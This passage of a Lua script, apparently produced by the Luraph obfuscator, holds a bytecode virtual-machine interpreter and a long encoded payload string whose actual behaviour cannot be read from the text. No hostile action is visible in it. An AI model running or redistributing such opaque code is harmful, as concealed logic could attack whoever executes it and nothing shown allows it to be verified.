for H1=1,E8 do do(b8[3])[H1-1]=eb();end;end;h8=1;end;end;end;end;end;local j8,K8=Qb,Qb;do for cM=0,4 do do if not(cM<=1)then if not(cM<=2)then if cM~=3 then(b8)[15]=W();else b8[7]=S();end;else for e9=1,z8 do local P9=(Qb);local L9=(S());local f9=(1);while f9~=5 do if not(f9<=1)then if f9<=2 then if L9==124 then do P9=E()+W();end;elseif L9==252 then P9=f(X(j8),3);elseif L9==177 then P9=f(X(j8),S());elseif L9==215 then do P9=E();end;elseif L9==128 then P9=f(X(j8),E()+W());elseif L9==7 then P9=cb;elseif L9==186 then P9=sb;elseif L9==ju then P9=f(X(j8),S());elseif L9==209 then P9=E();elseif L9==222 then do P9=f(X(j8),E()+W());end;elseif L9==43 then P9=Z();elseif L9~=3 then else P9=f(X(j8),S());end;f9=3;else do if f9~=3 then if L9==124 then P9=E()+W();elseif L9==252 then P9=f(X(j8),3);elseif L9==177 then do P9=f(X(j8),S());end;elseif L9==215 then P9=E();elseif L9==128 then P9=f(X(j8),E()+W());elseif L9==7 then P9=cb;elseif L9==186 then P9=sb;elseif L9==242 then do P9=f(X(j8),S());end;elseif L9==209 then P9=E();elseif L9==222 then P9=f(X(j8),E()+W());elseif L9==43 then P9=Z();elseif L9~=3 then else P9=f(X(j8),S());end;do f9=4;end;else if L9==124 then P9=E()+W();elseif L9==252 then do P9=f(X(j8),3);end;elseif L9==177 then P9=f(X(j8),S());elseif L9==215 then do P9=E();end;elseif L9==Tu then do P9=f(X(j8),E()+W());end;elseif L9==7 then P9=cb;elseif L9==186 then P9=sb;elseif L9==242 then P9=f(X(j8),S());elseif L9==209 then P9=E();elseif L9==222 then P9=f(X(j8),E()+W());elseif L9==43 then P9=Z();elseif L9~=3 then else P9=f(X(j8),S());end;do f9=2;end;end;end;end;else do if f9~=0 then do if L9==124 then P9=E()+W();elseif L9==252 then do P9=f(X(j8),3);end;elseif L9==177 then P9=f(X(j8),S());elseif L9==215 then do P9=E();end;elseif L9==128 then P9=f(X(j8),E()+W());elseif L9==7 then P9=cb;elseif L9==186 then do P9=sb;end;elseif L9==242 then P9=f(X(j8),S());elseif L9==209 then do P9=E();end;elseif L9==mu then do P9=f(X(j8),E()+W());end;elseif L9==43 then P9=Z();elseif L9==3 then P9=f(X(j8),S());end;end;f9=5;else if L9==124 then P9=E()+W();elseif L9==252 then P9=f(X(j8),3);elseif L9==Bu then P9=f(X(j8),S());elseif L9==215 then P9=E();elseif L9==128 then do P9=f(X(j8),E()+W());end;elseif L9==7 then P9=cb;elseif L9==186 then do P9=sb;end;elseif L9==242 then P9=f(X(j8),S());elseif L9==uu then P9=E();elseif L9==222 then P9=f(X(j8),E()+W());elseif L9==43 then P9=Z();elseif L9~=3 then else do P9=f(X(j8),S());end;end;f9=1;end;end;end;end;f9=1;local G9=(Qb);repeat if not(f9<=1)then if f9~=2 then do(c8)[C8]=G9;end;f9=2;else C8=C8+1;break;end;else if f9==0 then G9={P9,{}};f9=3;else Q8[e9-1]=C8;f9=0;end;end;until(sb);do if not(K8)then else local tH=(1);while(cb)do if tH~=0 then N[h]=G9;tH=0;else h=h+1;do break;end;end;end;end;end;end;end;else if cM~=0 then K8=S()~=0;else j8=S();end;end;end;end;end;local x8,B8=Qb,(Qb);do for xA=0,2 do if xA<=0 then do x8=W()-133782;end;else do if xA~=1 then do for fj=1,x8 do local Ij=(0);local rj,Cj=Qb,Qb;repeat do if Ij~=0 then Cj=G(B8);break;else do rj={Qb,Qb,Qb,Qb,Qb,Qb,Qb,Qb,Qb,Qb};end;do Ij=1;end;end;end;until(sb);Ij=6;while Ij<=17 do if not(Ij<=8)then do if not(Ij<=12)then if Ij<=14 then if Ij~=13 then rj[18]=s(Cj,24,29);Ij=11;else(rj)[2]=s(Cj,6,8);Ij=0;end;else if not(Ij<=15)then do if Ij~=16 then do(rj)[20]=s(Cj,13,15);end;Ij=7;else do rj[16]=s(Cj,24,30);end;Ij=18;end;end;else do(rj)[2]=s(Cj,6,8);end;Ij=13;end;end;else if not(Ij<=10)then if Ij==11 then do(rj)[20]=s(Cj,13,15);end;do Ij=8;end;else rj[18]=s(Cj,24,29);Ij=13;end;else if Ij==9 then rj[6]=s(Cj,23,9);Ij=4;else do rj[19]=s(Cj,18,10);end;do Ij=3;end;end;end;end;end;else do if not(Ij<=3)then if not(Ij<=5)then do if not(Ij<=6)then do if Ij~=7 then do(rj)[2]=s(Cj,6,8);end;Ij=9;else(rj)[3]=s(Cj,14,18);Ij=5;end;end;else(rj)[19]=s(Cj,18,10);Ij=14;end;end;else if Ij~=4 then(rj)[8]=S();Ij=16;else rj[1]=s(Cj,14,9);Ij=7;end;end;else do if not(Ij<=1)then if Ij~=2 then(rj)[19]=s(Cj,18,10);do Ij=10;end;else rj[2]=s(Cj,6,8);Ij=1;end;else do if Ij~=0 then(rj)[8]=S();Ij=14;else rj[2]=s(Cj,6,8);Ij=15;end;end;end;end;end;end;end;end;(b8[1])[fj]=rj;end;end;else B8=S();end;end;end;end;end;local F8=t[b8[6]];h8=0;do repeat if h8~=0 then do return b8;end;else for mZ=1,x8 do local aZ=(b8[1][mZ]);local nZ=F8[aZ[8]];local GZ=nZ==2;do if nZ~=4 then else aZ[3]=mZ+(aZ[3]-131071)+1;end;end;do if(nZ==0 or GZ)and aZ[6]>255 then local VX,rX,kX=0,Qb,(Qb);do while(cb)do if not(VX<=1)then if VX~=2 then kX=c8[rX];VX=2;else if not(kX)then else local i7=1;local b7=Qb;do while i7<3 do if not(i7<=0)then do if i7~=1 then do b7=kX[2];end;i7=0;else(aZ)[10]=kX[1];i7=2;end;end;else do b7[#b7+1]={aZ,10};end;do i7=3;end;end;end;end;end;break;end;else if VX~=0 then do rX=Q8[aZ[6]-256];end;VX=3;else aZ[4]=cb;VX=1;end;end;end;end;end;end;do if nZ~=9 then else local eK,NK=Qb,Qb;do for bi=0,2 do if not(bi<=0)then if bi~=1 then if NK then local KU=0;local HU=(Qb);while KU~=3 do do if not(KU<=0)then do if KU~=1 then HU[#HU+1]={aZ,9};KU=3;else do HU=NK[2];end;KU=2;end;end;else(aZ)[9]=NK[1];KU=1;end;end;end;end;else do NK=c8[eK];end;end;else eK=Q8[aZ[3]];end;end;end;end;end;if not((nZ==15 or GZ)and aZ[1]>255)then else do(aZ)[7]=cb;end;local GE,gE,nE=2,Qb,(Qb);repeat if GE<=0 then if not(nE)then else local oX=Qb;for x4=0,2 do do if not(x4<=0)then if x4==1 then oX=nE[2];else oX[#oX+1]={aZ,5};end;else do(aZ)[5]=nE[1];end;end;end;end;end;break;else if GE~=1 then do gE=Q8[aZ[1]-256];end;GE=1;else nE=c8[gE];GE=0;end;end;until(sb);end;end;h8=1;end;until(sb);end;end;else function Ib(tE,HE,ME)local YE,sE=ME[1],ME[3];local NE,yE,VE=ME[7],ME[2],ME[5];local mE,dE,vE=ME[9],ME[8],ME[6];local xE=(L({},{__mode=Xb}));local eE=Qb;eE=function(...)local zC=1;local IC={};local HC=(0);local CC=(V and V()or qb);local jC=((CC==d and tE or CC));local xC,SC=D(...);xC=xC-1;do for c3=0,xC do if not(NE>c3)then break;else do(IC)[c3]=SC[c3+1];end;end;end;end;kb[1]=ME;do(kb)[2]=IC;end;if not mE then SC=Qb;elseif not(dE)then else do(IC)[NE]={[tb]=xC>=NE and xC-NE+1 or 0,z(SC,NE+1,xC+1)};end;end;if jC~=CC then do if not(i)then qb=jC;else i(eE,jC);end;end;end;local nC,vC,BC,QC=J(function()while true do local Zq=(YE[zC]);local Sq=Zq[8];zC=zC+1;if not(Sq<54)then if Sq>=81 then if Sq<94 then if not(Sq<87)then if not(Sq>=90)then do if not(Sq>=88)then do IC[Zq[2]]=a(Zq[10],IC[Zq[1]]);end;else if Sq~=89 then do if Zq[1]==147 then zC=zC-1;YE[zC]={[8]=106,[2]=(Zq[2]-56)%256,[1]=(Zq[6]-56)%256};else do(IC)[Zq[2]]=#IC[Zq[6]];end;end;end;else IC[Zq[2]]=IC[Zq[6]]>Zq[5];end;end;end;else if Sq>=92 then if Sq~=93 then do IC[Zq[2]][Zq[10]]=IC[Zq[1]];end;else if Zq[1]~=Uu then(IC)[Zq[2]]=-IC[Zq[6]];else zC=zC-1;do(YE)[zC]={[8]=13,[2]=(Zq[2]-83)%256,[6]=(Zq[6]-83)%256};end;end;end;else if Sq~=91 then IC[Zq[2]]=jC[Zq[9]];else local JZ=Zq[2];(IC[JZ])(IC[JZ+1],IC[JZ+2]);HC=JZ-1;end;end;end;else if not(Sq<84)then if not(Sq<85)then if Sq==86 then do kb[Zq[6]]=IC[Zq[2]];end;else IC[Zq[2]]=IC[Zq[6]][IC[Zq[1]]];end;else do IC[Zq[2]]=kb[Zq[6]];end;end;else do if not(Sq>=82)then local DO,GO=sE[Zq[3]],Qb;local HO=DO[4];if not(HO>0)then else GO={};for zG=0,HO-1 do local DG=YE[zC];local tG=(DG[8]);if tG~=26 then GO[zG]=HE[DG[6]];else GO[zG]={IC,DG[6]};end;zC=zC+1;end;(T)(xE,GO);end;IC[Zq[2]]=Ib(jC,GO,DO);else do if Sq==83 then IC[Zq[2]][Zq[10]]=Zq[5];else IC[Zq[2]]=Zq[10]%IC[Zq[1]];end;end;end;end;end;end;else do if not(Sq<101)then if not(Sq>=104)then if not(Sq<102)then if Sq==103 then if Zq[1]~=64 then repeat local wG,yG=xE,(IC);if not(#wG>0)then else local DU=({});for NV,YV in H,wG do for ck,Gk in H,YV do if not(Gk[1]==yG and Gk[2]>=0)then else local wd=Gk[2];if not DU[wd]then DU[wd]={yG[wd]};end;(Gk)[1]=DU[wd];Gk[2]=1;end;end;end;end;until cb;local DF=(Zq[2]);return sb,DF,DF+Zq[6]-2;else zC=zC-1;YE[zC]={[2]=(Zq[2]-40)%256,[8]=106,[1]=(Zq[6]-40)%256};end;else IC[Zq[2]]=IC[Zq[6]]+IC[Zq[1]];end;else do if Zq[6]~=58 then if IC[Zq[2]]then zC=zC+1;end;else zC=zC-1;(YE)[zC]={[8]=8,[6]=(Zq[1]-173)%256,[2]=(Zq[2]-173)%256};end;end;end;else if not(Sq>=106)then if Sq~=105 then(IC)[Zq[2]]=IC[Zq[6]]==IC[Zq[1]];else(IC)[Zq[2]]=sb;end;else if Sq~=107 then do if Zq[6]==171 then do zC=zC-1;end;(YE)[zC]={[6]=(Zq[1]-220)%256,[8]=36,[2]=(Zq[2]-220)%256};else local xL=(Zq[2]);local sL,FL=xL+2,(xL+3);local ML={IC[xL](IC[xL+1],IC[sL])};do for Qf=1,Zq[1]do do(IC)[sL+Qf]=ML[Qf];end;end;end;local aL=IC[FL];if aL==Qb then zC=zC+1;else(IC)[sL]=aL;end;end;end;else IC[Zq[2]]=IC[Zq[6]]*Zq[5];end;end;end;else if not(Sq<97)then do if not(Sq<99)then if Sq==100 then local kR=Zq[2];local uR=Zq[6];do HC=kR+uR-1;end;repeat local qo,ro=xE,(IC);if#qo>0 then local qF={};do for TA,xA in H,qo do for k7,j7 in H,xA do if not(j7[1]==ro and j7[2]>=0)then else local pC=(j7[2]);if not(not qF[pC])then else(qF)[pC]={ro[pC]};end;do(j7)[1]=qF[pC];end;(j7)[2]=1;end;end;end;end;end;until cb;return cb,kR,uR;else IC[Zq[2]]=Zq[10]==IC[Zq[1]];end;else if Sq==98 then do repeat local BJ,sJ=xE,(IC);if#BJ>0 then local Xd={};do for BA,dA in H,BJ do do for WM,NM in H,dA do if not(NM[1]==sJ and NM[2]>=0)then else local L7=(NM[2]);if not Xd[L7]then Xd[L7]={sJ[L7]};end;(NM)[1]=Xd[L7];do(NM)[2]=1;end;end;end;end;end;end;end;until cb;end;return cb,Zq[2],0;else IC[Zq[2]]=Zq[10]%Zq[5];end;end;end;else do if not(Sq>=95)then jC[Zq[9]]=IC[Zq[2]];else if Sq==96 then do IC[Zq[2]]=Zq[10]^Zq[5];end;else IC[Zq[2]]=y(IC[Zq[6]],IC[Zq[1]]);end;end;end;end;end;end;end;else if not(Sq<67)then if Sq<74 then if not(Sq>=70)then if not(Sq<68)then if Sq~=69 then IC[Zq[2]]=p(Zq[10],Zq[5]);else if Zq[1]~=23 then repeat local vM,BM,wM=xE,IC,Zq[2];if#vM>0 then local zT={};for nz,qz in H,vM do do for MQ,vQ in H,qz do do if not(vQ[1]==BM and vQ[2]>=wM)then else local EJ=(vQ[2]);if not(not zT[EJ])then else(zT)[EJ]={BM[EJ]};end;(vQ)[1]=zT[EJ];do vQ[2]=1;end;end;end;end;end;end;end;until cb;else zC=zC-1;do YE[zC]={[8]=26,[6]=(Zq[6]-146)%ku,[2]=(Zq[2]-bu)%256};end;end;end;else do IC[Zq[2]]=IC[Zq[6]]~=IC[Zq[1]];end;end;else if Sq>=72 then if Sq~=73 then local sP=Zq[2];(IC)[sP]=IC[sP](IC[sP+1]);HC=sP;else IC[Zq[2]]={z({},1,Zq[6])};end;else do if Sq==71 then if Zq[1]~=127 then repeat local i0,v0=xE,(IC);do if not(#i0>0)then else local ho={};for dH,zH in H,i0 do do for nr,ar in H,zH do do if not(ar[1]==v0 and ar[2]>=0)then else local Sv=ar[2];if not(not ho[Sv])then else(ho)[Sv]={v0[Sv]};end;do ar[1]=ho[Sv];end;(ar)[2]=1;end;end;end;end;end;end;end;until cb;return sb,Zq[2],HC;else zC=zC-1;YE[zC]={[2]=(Zq[2]-38)%256,[8]=101,[1]=(Zq[6]-38)%256};end;else do if Zq[1]==198 then zC=zC-1;do(YE)[zC]={[2]=(Zq[2]-163)%256,[1]=(Zq[6]-163)%ku,[8]=23};end;else(IC)[Zq[2]]=SC[NE+1];end;end;end;end;end;end;else if not(Sq>=77)then do if not(Sq<75)then do if Sq~=76 then if Zq[1]~=Cu then for R0=Zq[2],Zq[6]do do(IC)[R0]=Qb;end;end;else zC=zC-1;(YE)[zC]={[8]=93,[6]=(Zq[6]-5)%256,[2]=(Zq[2]-5)%ku};end;else IC[Zq[2]]=Zq[9];end;end;else do(IC)[Zq[2]]=v(IC[Zq[6]],IC[Zq[1]]);end;end;end;else if not(Sq>=79)then if Sq==78 then IC[Zq[2]]={};else(IC)[Zq[2]]=IC[Zq[6]]<IC[Zq[1]];end;else if Sq~=80 then(IC)[Zq[2]]=Zq[10]/IC[Zq[1]];else(IC)[Zq[2]]=IC[Zq[6]]/IC[Zq[1]];end;end;end;end;else if not(Sq<60)then do if not(Sq<63)then if not(Sq>=65)then if Sq~=64 then local ZR=Zq[2];(IC[ZR])(z(IC,ZR+1,HC));HC=ZR-1;else local pC=(HE[Zq[6]]);do(pC[1])[pC[2]]=IC[Zq[2]];end;end;else do if Sq==66 then IC[Zq[2]]=IC[Zq[6]]>=Zq[5];else(IC)[Zq[2]]=a(IC[Zq[6]],IC[Zq[1]]);end;end;end;else if not(Sq>=61)then do(IC)[Zq[2]]=IC[Zq[6]][Zq[5]];end;else if Sq==62 then(IC)[Zq[2]]=F(Zq[10],Zq[5]);else do if not(not(Zq[10]<=Zq[5]))then else do zC=zC+1;end;end;end;end;end;end;end;else if not(Sq<57)then if not(Sq<58)then do if Sq~=59 then local rI=(HE[Zq[6]]);do(IC)[Zq[2]]=rI[1][rI[2]];end;else if not(not(IC[Zq[6]]<=IC[Zq[1]]))then else zC=zC+1;end;end;end;else IC[Zq[2]]=Zq[10]<IC[Zq[1]];end;else if not(Sq<55)then if Sq~=56 then local PZ=(Zq[2]);IC[PZ]=IC[PZ](IC[PZ+1],IC[PZ+2]);HC=PZ;else if IC[Zq[6]]~=Zq[5]then else do zC=zC+1;end;end;end;else if not(Zq[10]<IC[Zq[1]])then zC=zC+1;end;end;end;end;end;end;else do if not(Sq<27)then if not(Sq<40)then if Sq<47 then do if not(Sq>=43)then if not(Sq>=41)then IC[Zq[2]]=Zq[9];else if Sq~=42 then IC[Zq[2]]=a(IC[Zq[6]],Zq[5]);else do if Zq[1]~=195 then local hU=(Zq[2]);for HH=hU,hU+(Zq[6]-1)do IC[HH]=SC[NE+(HH-hU)+1];end;else zC=zC-1;do(YE)[zC]={[6]=(Zq[6]-197)%256,[2]=(Zq[2]-197)%256,[8]=8};end;end;end;end;end;else if not(Sq>=45)then if Sq~=44 then if IC[Zq[6]]==IC[Zq[1]]then else zC=zC+1;end;else(IC)[Zq[2]]=y(Zq[10],Zq[5]);end;else if Sq==46 then local oU=(Zq[6]);local RU=IC[oU];for xh=oU+1,Zq[1]do RU=RU..IC[xh];end;IC[Zq[2]]=RU;else if IC[Zq[6]]~=IC[Zq[1]]then else do zC=zC+1;end;end;end;end;end;end;else if not(Sq>=50)then if not(Sq<48)then if Sq==49 then if Zq[1]==184 then zC=zC-1;(YE)[zC]={[8]=36,[2]=(Zq[2]-143)%256,[6]=(Zq[6]-143)%256};elseif Zq[1]==Iu then zC=zC-1;(YE)[zC]={[8]=71,[2]=(Zq[2]-239)%256,[6]=(Zq[6]-239)%ku};elseif Zq[1]==228 then zC=zC-1;YE[zC]={[2]=(Zq[2]-203)%256,[8]=13,[6]=(Zq[6]-203)%256};elseif Zq[1]~=220 then IC[Zq[2]]=not IC[Zq[6]];else zC=zC-1;do YE[zC]={[8]=eu,[1]=(Zq[6]-139)%256,[2]=(Zq[2]-Ju)%256};end;end;else local KU,YU=Zq[2],(Zq[1]-1)*50;for L_=1,Zq[6]do IC[KU][YU+L_]=IC[KU+L_];end;end;else(IC)[Zq[2]]=IC[Zq[6]]>=IC[Zq[1]];end;else if not(Sq>=52)then if Sq==51 then(IC[Zq[2]])[IC[Zq[6]]]=IC[Zq[1]];else IC[Zq[2]]=IC[Zq[6]]%Zq[5];end;else do if Sq~=53 then do IC[Zq[2]]=IC[Zq[6]]>IC[Zq[1]];end;else local En=IC[Zq[6]];if not En then zC=zC+1;else(IC)[Zq[2]]=En;end;end;end;end;end;end;else if not(Sq>=33)then if not(Sq>=30)then if Sq>=28 then if Sq~=29 then zC=Zq[3];else local Wm=(Zq[10]/IC[Zq[1]]);IC[Zq[2]]=Wm-Wm%1;end;else if not(IC[Zq[6]]<=Zq[5])then else zC=zC+1;end;end;else if not(Sq<31)then if Sq==32 then local vi=Zq[6];IC[Zq[2]]=IC[vi]..IC[vi+1];else IC[Zq[2]]=IC[Zq[6]]%IC[Zq[1]];end;else(IC)[Zq[2]]=Zq[10]^IC[Zq[1]];end;end;else if not(Sq>=36)then do if not(Sq<34)then if Sq~=35 then local Df=(Zq[2]);local gf=(Zq[1]-1)*50;do for jR=1,HC-Df do IC[Df][gf+jR]=IC[Df+jR];end;end;else(IC[Zq[2]])[IC[Zq[6]]]=Zq[5];end;else if Zq[10]==IC[Zq[1]]then else zC=zC+1;end;end;end;else if not(Sq<38)then if Sq~=39 then do IC[Zq[2]]=IC[Zq[6]]^IC[Zq[1]];end;else local Sj=(Zq[2]);local aj=IC[Zq[6]];local Zj=(IC[Zq[1]]);do IC[Sj+1]=aj;end;IC[Sj]=aj[Zj];end;else do if Sq~=37 then repeat local hr,Tr=xE,(IC);do if not(#hr>0)then else local nR={};do for vu,ou in H,hr do for z0,P0 in H,ou do if not(P0[1]==Tr and P0[2]>=0)then else local oX=(P0[2]);if not(not nR[oX])then else(nR)[oX]={Tr[oX]};end;(P0)[1]=nR[oX];do P0[2]=1;end;end;end;end;end;end;end;until cb;return;else do(IC)[Zq[2]]=IC[Zq[6]]-IC[Zq[1]];end;end;end;end;end;end;end;else if not(Sq>=13)then if Sq<6 then if not(Sq<3)then do if not(Sq>=4)then do IC[Zq[2]]=IC[Zq[6]]~=Zq[5];end;else do if Sq~=5 then(IC)[Zq[2]]=Zq[10]<Zq[5];else IC[Zq[2]]=IC[Zq[6]]^Zq[5];end;end;end;end;else if not(Sq>=1)then(IC)[Zq[2]]=IC[Zq[6]]<=IC[Zq[1]];else do if Sq~=2 then do IC[Zq[2]]=Zq[10]>IC[Zq[1]];end;else IC[Zq[2]]=Zq[10]*Zq[5];end;end;end;end;else do if not(Sq<9)then if not(Sq>=11)then if Sq==10 then local Py,by=Zq[2],Zq[6];local ly=(Zq[1]);if by~=0 then HC=Py+by-1;end;local sy,Ly=Qb,(Qb);if by==1 then sy,Ly=D(IC[Py]());else sy,Ly=D(IC[Py](z(IC,Py+1,HC)));end;if ly==1 then HC=Py-1;else if ly~=0 then sy=Py+ly-2;HC=sy+1;else sy=sy+Py-1;HC=sy;end;local mS=(0);for sA=Py,sy do mS=mS+1;IC[sA]=Ly[mS];end;end;else(IC)[Zq[2]]=IC[Zq[6]]*IC[Zq[1]];end;else if Sq==12 then if not(not(Zq[10]<Zq[5]))then else do zC=zC+1;end;end;else(IC)[Zq[2]]=cb;end;end;else if not(Sq>=7)then repeat local nT,wT=xE,IC;do if not(#nT>0)then else local fD=({});for Ic,Dc in H,nT do do for NA,FA in H,Dc do if not(FA[1]==wT and FA[2]>=0)then else local cx=(FA[2]);if not(not fD[cx])then else do fD[cx]={wT[cx]};end;end;FA[1]=fD[cx];FA[2]=1;end;end;end;end;end;end;until cb;return cb,Zq[2],1;else if Sq==8 then do(IC)[Zq[2]]=Qb;end;else local MF=(Zq[2]);local TF=(IC[MF+2]);local QF=IC[MF]+TF;do(IC)[MF]=QF;end;if TF>0 then do if not(QF<=IC[MF+1])then else zC=Zq[3];do IC[MF+3]=QF;end;end;end;else do if not(QF>=IC[MF+1])then else zC=Zq[3];IC[MF+3]=QF;end;end;end;end;end;end;end;end;else if not(Sq<20)then if not(Sq<23)then do if not(Sq<25)then if Sq==26 then do if Zq[1]~=97 then(IC)[Zq[2]]=IC[Zq[6]];else zC=zC-1;do YE[zC]={[2]=(Zq[2]-90)%256,[8]=106,[1]=(Zq[6]-90)%256};end;end;end;else repeat local ws,Ds=xE,(IC);if not(#ws>0)then else local Xq=({});for Ap,dp in H,ws do for ln,Un in H,dp do if not(Un[1]==Ds and Un[2]>=0)then else local zm=Un[2];if not(not Xq[zm])then else(Xq)[zm]={Ds[zm]};end;(Un)[1]=Xq[zm];Un[2]=1;end;end;end;end;until cb;local JS=(Zq[2]);return sb,JS,JS;end;else do if Sq~=24 then do if Zq[6]~=109 then do if not(not IC[Zq[2]])then else zC=zC+1;end;end;else zC=zC-1;YE[zC]={[2]=(Zq[2]-146)%ku,[8]=25,[6]=(Zq[1]-146)%ku};end;end;else local W2=(Zq[2]);do IC[W2]=IC[W2](z(IC,W2+1,HC));end;HC=W2;end;end;end;end;else do if not(Sq>=21)then if IC[Zq[6]]==Zq[5]then else do zC=zC+1;end;end;else if Sq==22 then local jy=(IC[Zq[6]]/IC[Zq[1]]);do(IC)[Zq[2]]=jy-jy%1;end;else local eZ=Zq[2];local nZ,oZ=eZ+1,(eZ+2);(IC)[eZ]=k(e(IC[eZ]),Db);(IC)[nZ]=k(e(IC[nZ]),Nb);IC[oZ]=k(e(IC[oZ]),hb);IC[eZ]=IC[eZ]-IC[oZ];zC=Zq[3];end;end;end;end;else do if not(Sq<16)then if Sq>=18 then if Sq~=19 then local xz=(Zq[2]);HC=xz+Zq[6]-1;IC[xz](z(IC,xz+1,HC));HC=xz-1;else IC[Zq[2]]=O(IC[Zq[6]]);end;else if Sq==17 then IC[Zq[2]]=IC[Zq[6]]==Zq[5];else HC=Zq[2];IC[HC]();HC=HC-1;end;end;else do if not(Sq>=14)then local Tq=xC-NE;local Kq=Zq[2];do if not(Tq<0)then else Tq=-1;end;end;for gZ=Kq,Kq+Tq do do(IC)[gZ]=SC[NE+(gZ-Kq)+1];end;end;HC=Kq+Tq;else do if Sq~=15 then local JK=Zq[2];(IC[JK])(IC[JK+1]);HC=JK-1;else IC[Zq[2]]=Zq[10]>Zq[5];end;end;end;end;end;end;end;end;end;end;end;end;end);do if not(nC)then if U(vC)~=fu then C(vC,0);else if not(j(vC,Ru))then else return coroutine.yield();end;if not(j(vC,"^.-:%d+: "))then(C)(vC,0);else(C)("Luraph Script:"..(VE[zC-1]or"(internal)")..": "..b(vC),0);end;end;else if vC then if QC~=1 then return IC[BC](z(IC,BC+1,HC));else return IC[BC]();end;elseif not(BC)then else return z(IC,BC,QC);end;end;end;end;if i then i(eE,tE);end;do return eE;end;end;end;else end;end;end;end;end;return Ib(d,Qb,Jb)(...);end)(177,false,"\97\116\116\101\109\112\116\32\116\111\32\121\105\101\108\100\32\97\99\114\111\115\115\32\109\101\116\97\109\101\116\104\111\100\47\67\37\45\99\97\108\108\32\98\111\117\110\100\97\114\121",true,7997,tonumber,"\114\115\104\105\102\116",209,string.byte,rawset,"\98\111\114","\105\110\115\101\114\116",202,"","\115\117\98",setmetatable,getfenv,185,"\110",select,"\98\110\111\116","LPH/2C8D01363H22452555523H254252552524223H25F22925222555222H5222252F522522522H555229255222F52H255952292225552H5225000B4H000200023H0061E20B3H00013H00083H00013H00093H00093H00D99BDB450A3H000A3H007DB33D1E0B3H000B3H005A9DE9630C3H000C3H0081395D260D3H000D3H0064E4AB1F0E3H000E3H0015E198370F3H000F3H008ACB3C6D103H00103H00DB128F7A113H00113H00827B4C37123H001A3H00013H000200013H00C23A0A3H00013H00083H00013H00093H00093H00CA189E6E0A3H000A3H0010F730010B3H000B3H0044FF86580C3H000C3H00BF7B8D750D3H000D3H00ECA2D7670E3H000E3H008747957C0F3H000F3H00E050173D103H00103H0019FBD225113H00173H00015H00013H0018BA073H00013H00083H00013H00093H00093H009B48B9140A3H000A3H00411A62350B3H000B3H00CF1BDB000C3H000C3H001A28CE780D3H000D3H007E73B1620E3H00163H00014H00015H0003510A0200A97CFC083H002C13534B7D45D07CFC063H0004AB342509BA003F0AA779AC0A0200518D4D8F0D1C52D250D21C6B2B69EB1C286829285119D92H195A2H0E0F0E2817D72F65492H84BFF149A519AE78354A4121756683101F971AE0C77F8F07318D3746644H465A2H6F2H2F5A3HFC7C1C7DFD2H3D5A423HC23ADB2H9B9A0A18983H18C98949C910BE5D5036310004500A0200C1F1FC073H00D65D1ADF07408602AC55FD13AD0A02005347C744C71C763675F61C2H2122A11C38B83938516BEB2H6B5A2AEA2H2A28A5E59DD549CC8C77B9498F3D30341CDEF2C4B351A93C659B3460E776E42C73B3BEEF67D2A133B964ED3287E556F44F2BA94BD73H575A3HC6461C2H312HB15AC83H08512H7BFB7B1AFA3A7A7B0EF5161B7D310003510A02008D18FC2B3H00C7A28AB03EE0795E4DC7D11D7AA8CF667F98634A8F7C44296727ADDDC50924E4BA385DF0656D28AB891053FC143H005CB366915CB69966D380D270FE12C3752BAD8540006E783B6CB00A0200419C5C9F2H1C4DCD4ECD1C024201821CCB4BCACB51F8382HF85A2H19181928FEBEC68C49B7370CC34954049AC15625B62EF3173A5683DE21637781BF2A70E590E50FB1A9321132F6A00EB8410FD7A941114CFF7EA223FDBD2HFD5A323H7228BB3HFB65A8A54FC551493HC9516E2EEE6F5B3HE7671C3H84884BD5A262806AB0AC4H000200063H009BC69H002H00024F0A0200CD2H00BED43E5BA70A020005AA2AA92A1CD797D4571C2HF8FB781CDD1D2HDD5196D62H965A73F32H73280444BC76491999A36F49028332DF112H8FABAC6010C89E0405D53D029C64AE63A1C839EBCC44821D5C4301026A11546E073B2HDA5ADA24B8424H00036H00034F0A0200FD2H00E6A4F668AC0A020021C787C3471C2HC4C0441CF535F6751C2A6A2B2A5173332H735A20A02H2028C141F9B1492H261C50499F695D8F6A7C2F387B4F4DEF421458E270F94B4D0BFA6B125318626F0E3E59140DC4541ED56A895D7717EC3C6AF491292036A51143B46B9A4F23B35DA3DF0DD4311067A7456A4C154H00036H00034F0A0200AD2H0057093C42A70A020077713172F11C2HECEF6C1C13D311931C2H96979651E5A52HE55A30B02H30282H675E15493AFA804C49D923727A3574A723FA1EFBAB1F06055E8709E234CDC43CB61A3HF8781C4F38F81A6AC2177BEB5D813HC14755F04H0003015H000B530A0200E900FC0A4H000714BC5B7623DCB9F32B017H00FC083H00BEF577CEC6A4D343FC033H00160DFF0158AC3A39D50A0200497CFC76FC1CB5F5BF351C2H1218921C23E32H2351B8F82HB85AE1A1E0E128EE2ED69C492H6F551849B467306C5ACD7033FF45CAF5333E263B94B41002F0A451140AF9C611D51726B2222F23C707C1471CEC9B5BB96AE5E72HE55AC2E4874E45D3132CAC1C28CF2D614511D1EE6E1CDE5C5EDF37DF3BA85A31A464AC241C7D3D7AFD1CBABB2HFA28EBAA2HAB65206367F44CE9A92EA91556D72H5618773789081CDC1C2H5C22D5552H1528323HF26583FB0E532798192H985A3H41C11CCE8F2HCE5A8F0E2HCF2854152H14656DD1DD8E45AADE538F315B1BA7241C503HD04ED93H5965C68FC60F34A7149E4231CC4C37B31C853H453A22E262E206F3B22H325508C8F7771C71B170712DBEFEBF3E1C2H7F89001C848604840BDDDF2HDD655ABD8AFE2A8B2DAE3D17C03CEE3731498974F6073676CA491C47D45H00065H0008550A02000500FC073H004356C5E2BE545D2B017H002BFF7H00FC033H00D42BD9D13H00205FA002422B9H000H00DE624130D90A020015D757DC571C084803881C2H3D36BD1C86C687865133B32H335AD414D5D42839B9014A497232C906490FD0C6AB2EA0C300970535A7A4803D9EB72C6A276B14F218602C9F89F86331483443614A27280668C73AF4875AB8F8BF381CAD4828E445F653B3FF45A36323220E840487041C2HE9A8A928E23HA265BF2419C73510D091902825A5E4E5280E3HCE655BAD17CE34DC9DDDDC286160E16340FA2H3A384037B737B640282H6869405D3H1D5A3HE6661C53932H135AF4FD2B27473H19991CD29228AD1CAF2F50D01C00C14142332H5550D51CBEFF7EFE3A3H8B0B1CCC0D2H8C5AD137D498452H6A94151C4HA73A3H18981C8D0D2H8D5A56D62H16288303020328E42H64E5373H89091C2H0282CF4B2HDF9E9F28B03HF06585C6BAA3292HAE2H2E28FB3H7B657CDC9CF66A81012H4128DA5A65E5152HD76DE807C8083CB71C3DDED3B53107094H0003015H00064F0A0200D500017023D959AF0A020043460643C61C2H2124A11C28E82CA81C2H0B0A0B513A7A2